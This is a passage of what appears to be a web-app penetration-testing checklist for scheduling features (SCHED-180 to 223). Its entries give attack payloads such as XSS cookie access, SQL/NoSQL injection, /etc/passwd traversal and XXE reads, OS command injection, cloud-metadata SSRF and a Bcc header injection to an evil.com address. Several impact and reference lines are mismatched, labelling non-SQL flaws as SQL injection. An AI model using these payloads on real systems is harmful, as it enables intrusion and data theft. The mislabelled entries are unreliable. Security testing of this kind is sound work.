```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-180 — Timezone XSS
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. Display timezone 2. Inject XSS as timezone 3. Timezone displayed 4. XSS executes

**Expected Result:** Timezone display should be sanitized

**Payload Example:**

```
timezone=<script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-181 — DST Boundary Exploitation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. Book near DST change 2. Time shifts 3. Double booking possible 4. Scheduling conflict

**Expected Result:** DST transitions should be handled

**Payload Example:**

```
Book 2:30 AM during spring forward
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-182 — Timezone Offset Overflow
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. Set timezone offset 2. Use extreme offset 3. Time calculation overflow 4. System error

**Expected Result:** Offset should be bounded

**Payload Example:**

```
{"utc_offset":99999}
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## SCHED-183 — Server Time Disclosure
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. Analyze server responses 2. Compare timestamps 3. Determine server timezone 4. Timing attacks

**Expected Result:** Server time should not be exposed

**Payload Example:**

```
Server timezone leaked in headers or responses
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Manual Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-184 — Timezone Preference IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. Set own timezone preference 2. Modify user_id 3. Change others' timezone 4. Cause confusion

**Expected Result:** Preference should be user-specific

**Payload Example:**

```
PUT /api/users/victim_id/timezone
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-185 — Timezone Conversion Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. Enter time in UTC 2. Bypass timezone conversion 3. Store incorrect time 4. Scheduling error

**Expected Result:** Conversion should be mandatory

**Payload Example:**

```
Submit raw UTC ignoring user timezone
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-186 — Timezone IANA Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. Select timezone 2. Inject invalid IANA code 3. Lookup error 4. System disclosure

**Expected Result:** Timezone should be validated against IANA

**Payload Example:**

```
timezone=../../../../etc/passwd
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-187 — Cross-Timezone Privacy Leak
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. View user's timezone 2. Infer location 3. Privacy violation 4. Stalking potential

**Expected Result:** Timezone should be protected

**Payload Example:**

```
User timezone exposed revealing location
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Manual Analysis

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## SCHED-188 — Timezone Sync Conflict
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. Multiple timezone sources 2. Sync conflict 3. Inconsistent times 4. Missed appointments

**Expected Result:** Timezone should have single source of truth

**Payload Example:**

```
Conflicting timezones from sync sources
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-189 — Negative Timezone Offset
**Test Category:** Input Validation · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. Set timezone offset 2. Use invalid negative 3. Time calculation error 4. Unexpected behavior

**Expected Result:** Offsets should be validated

**Payload Example:**

```
{"utc_offset":-999}
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## SCHED-190 — Scheduling API Authentication Bypass
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Access scheduling API 2. Remove auth token 3. Access without authentication 4. Unauthorized access

**Expected Result:** All API endpoints should require authentication

**Payload Example:**

```
API call without Authorization header
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SCHED-191 — Scheduling Authorization Bypass
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Access own schedules 2. Access others' schedules 3. No authorization check 4. Data breach

**Expected Result:** Authorization should be checked per request

**Payload Example:**

```
Access any schedule without ownership check
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-192 — Scheduling SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Query schedules 2. Inject SQL in any parameter 3. Execute malicious query 4. Full database access

**Expected Result:** All queries should be parameterized

**Payload Example:**

```
Any parameter: '; SELECT * FROM schedules--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-193 — Scheduling NoSQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Query with NoSQL filter 2. Inject NoSQL operators 3. Bypass filters 4. Access all data

**Expected Result:** NoSQL queries should be sanitized

**Payload Example:**

```
{"$gt":"",user_id:{"$ne":null}}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** NoSQLMap / Burp Suite

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## SCHED-194 — Scheduling XSS via Any Input
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Submit XSS in any input field 2. Data stored or reflected 3. View output 4. XSS executes

**Expected Result:** All outputs should be encoded

**Payload Example:**

```
<script>alert(document.cookie)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-195 — Scheduling CSRF on State Changes
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Create malicious page 2. Trigger scheduling modification 3. User visits 4. Schedule altered

**Expected Result:** All mutations should have CSRF protection

**Payload Example:**

```
CSRF for create/update/delete operations
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SCHED-196 — Scheduling Mass Assignment
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Create/update schedule 2. Add extra parameters 3. Modify restricted fields 4. Privilege escalation

**Expected Result:** Only allowed fields should be accepted

**Payload Example:**

```
{"title":"test",owner_id:"admin",is_system:true}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## SCHED-197 — Scheduling Sensitive Data Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. View API responses 2. Find sensitive fields 3. Extract PII or secrets 4. Data breach

**Expected Result:** Only necessary data should be returned

**Payload Example:**

```
API response with user emails or phone numbers
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-198 — Scheduling Verbose Error Messages
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Trigger scheduling errors 2. Analyze error messages 3. Extract system info 4. Reconnaissance

**Expected Result:** Errors should be generic in production

**Payload Example:**

```
Stack traces or SQL errors in response
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Error Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-199 — Scheduling Rate Limiting Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Hit rate limit 2. Bypass via headers 3. Continue requests 4. Data scraping

**Expected Result:** Rate limiting should be robust

**Payload Example:**

```
X-Forwarded-For rotation
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotate

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SCHED-200 — Scheduling Path Traversal
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Request schedule file 2. Inject path traversal 3. Access system files 4. Information disclosure

**Expected Result:** File paths should be validated

**Payload Example:**

```
filename=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## SCHED-201 — Scheduling SSRF via Webhook
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Configure webhook 2. Provide internal URL 3. Schedule triggers webhook 4. SSRF

**Expected Result:** Webhook URLs should be validated

**Payload Example:**

```
webhook=http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## SCHED-202 — Scheduling XXE via ICS Import
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Import ICS calendar 2. Include XXE payload 3. File parsed 4. Server file disclosure

**Expected Result:** ICS import should sanitize content

**Payload Example:**

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## SCHED-203 — Scheduling Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Create schedule with template syntax 2. Schedule renders 3. Template executes 4. Code execution

**Expected Result:** Schedule content should not be templated

**Payload Example:**

```
{{constructor.constructor('return this')()}}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## SCHED-204 — Scheduling Command Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Schedule uses system commands 2. Inject OS command 3. Command executes 4. Server compromise

**Expected Result:** Commands should never use user input

**Payload Example:**

```
; cat /etc/passwd ; or | whoami
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite / Commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## SCHED-205 — Scheduling Clickjacking
**Test Category:** UI Redressing · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Frame scheduling page 2. Create overlay 3. Trick user 4. Unauthorized action

**Expected Result:** Scheduling should have X-Frame-Options

**Payload Example:**

```
Invisible iframe over booking button
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite Clickbandit / Custom HTML

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## SCHED-206 — Scheduling CORS Misconfiguration
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Send cross-origin request 2. Check CORS headers 3. Access data cross-origin 4. Data theft

**Expected Result:** CORS should restrict origins

**Payload Example:**

```
Origin: https://evil.com with credentials
```

**Impact:** CORS misconfiguration -&gt; credentialed cross-origin secret theft -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS; Christian Schneider

---

## SCHED-207 — Scheduling WebSocket Security
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Connect to scheduling WebSocket 2. Access without auth 3. Receive real-time data 4. Unauthorized access

**Expected Result:** WebSocket should require authentication

**Payload Example:**

```
WS connection without auth token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / WS King

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-208 — Scheduling GraphQL Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Query schedules via GraphQL 2. Inject malicious query 3. Access unauthorized data 4. Over-fetching

**Expected Result:** GraphQL should enforce field-level security

**Payload Example:**

```
{ schedule { id privateNotes adminFields } }
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Voyager / Altair / Burp Suite

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## SCHED-209 — Scheduling GraphQL DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Send complex GraphQL query 2. Deeply nested 3. Exhaust resources 4. DoS

**Expected Result:** Query depth and complexity should be limited

**Payload Example:**

```
{ schedule { events { attendees { schedules... } } } }
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** GraphQL Tools / Burp Suite

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SCHED-210 — Scheduling Batch Processing Abuse
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Submit batch request 2. Include many items 3. Exhaust resources 4. DoS

**Expected Result:** Batch operations should be limited

**Payload Example:**

```
Batch request with 10000 bookings
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SCHED-211 — Scheduling Cache Poisoning
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Request cached schedule 2. Inject via headers 3. Poison cache 4. Serve malicious content

**Expected Result:** Cache should be user-specific

**Payload Example:**

```
X-Forwarded-Host injection
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## SCHED-212 — Scheduling Session Fixation
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Get session before auth 2. User authenticates 3. Use fixed session 4. Access schedules

**Expected Result:** Session should regenerate on auth

**Payload Example:**

```
Fixed session_id accessing schedules
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## SCHED-213 — Scheduling JWT Manipulation
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Capture scheduling JWT 2. Modify claims 3. Access as different user 4. Privilege escalation

**Expected Result:** JWT should be properly validated

**Payload Example:**

```
{"alg":"none"} or modify user_id claim
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / Burp Suite JWT Editor

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## SCHED-214 — Scheduling Insecure Deserialization
**Test Category:** Insecure Deserialization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Find serialized schedule data 2. Modify serialized object 3. Deserialize 4. Code execution

**Expected Result:** Deserialization should be safe

**Payload Example:**

```
PHP/Java/Python serialized payload
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** ysoserial / phpggc / Burp Suite

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## SCHED-215 — Scheduling Log Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Submit data logged 2. Inject log format 3. Forge log entries 4. Audit trail manipulation

**Expected Result:** Logs should sanitize user input

**Payload Example:**

```
input=valid\nFake admin action logged
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Log Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-216 — Scheduling Email Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Schedule sends email 2. Inject headers 3. Send spam 4. Reputation damage

**Expected Result:** Email fields should be sanitized

**Payload Example:**

```
recipient=test@test.com%0ABcc:spam@evil.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-217 — Scheduling Prototype Pollution
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Send JSON with __proto__ 2. Pollute prototype 3. Affect application 4. Security bypass

**Expected Result:** Prototype pollution should be prevented

**Payload Example:**

```
{"__proto__":{"isAdmin":true}}
```

**Impact:** Prototype pollution -&gt; DOM XSS (client) / RCE (server).

**Tools:** Burp Suite / Postman

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP

---

## SCHED-218 — Scheduling Second-Order Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Store payload in schedule 2. Trigger processing 3. Payload executes 4. Delayed injection

**Expected Result:** All data usage should be sanitized

**Payload Example:**

```
Payload stored then used in report generation
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-219 — Scheduling Timing Attack
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Query schedule data 2. Measure response time 3. Infer data existence 4. Information leakage

**Expected Result:** Response time should be consistent

**Payload Example:**

```
Timing differences for booked vs available slots
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-220 — Scheduling Metadata Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. View schedule metadata 2. Find internal info 3. Extract system details 4. Reconnaissance

**Expected Result:** Metadata should not expose internals

**Payload Example:**

```
Creator internal ID or system paths in metadata
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-221 — Scheduling Concurrent Access Conflict
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Edit schedule from two sessions 2. Save simultaneously 3. Data corruption 4. Lost updates

**Expected Result:** Concurrent edits should be handled

**Payload Example:**

```
Parallel PUT requests to same schedule
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Multiple Browsers

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## SCHED-222 — Scheduling Version Control Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Access schedule version 2. Modify version_id 3. Access unauthorized versions 4. Historical data access

**Expected Result:** Version access should verify permissions

**Payload Example:**

```
GET /api/schedules/123/versions/unauthorized
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-223 — Scheduling Audit Log Tampering
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Scheduling Security

**Test Steps:** 1. Access audit logs 2. Modify or delete entries 3. Cover tracks 4. Evidence destruction

**Expected Result:** Audit logs should be immutable

**Payload Example:**

```
DELETE /api/audit-logs/incriminating_entry
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

